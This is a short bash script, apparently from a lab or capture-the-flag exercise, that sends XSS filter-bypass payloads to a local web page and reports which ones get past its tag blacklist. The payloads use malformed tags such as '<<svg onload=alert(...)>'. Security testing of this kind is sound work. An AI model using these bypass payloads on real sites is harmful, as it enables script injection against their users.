test_p() {
  resp=$(curl -s -G "http://127.0.0.1:59469/page" --data-urlencode "name=$1")
  if echo "$resp" | grep -q "you can't use that tag"; then echo "BLOCKED : $1";
  else echo "PASSED  : $1  ::  $(echo "$resp" | grep -o '> <.*>$' | head -1)"; fi
}
test_p "<<svg onload=alert('XSS')>"
test_p "<<img src=x onerror=alert('XSS')>"
test_p "<1svg onload=alert('XSS')>"
test_p "<z><svg onload=alert('XSS')>"

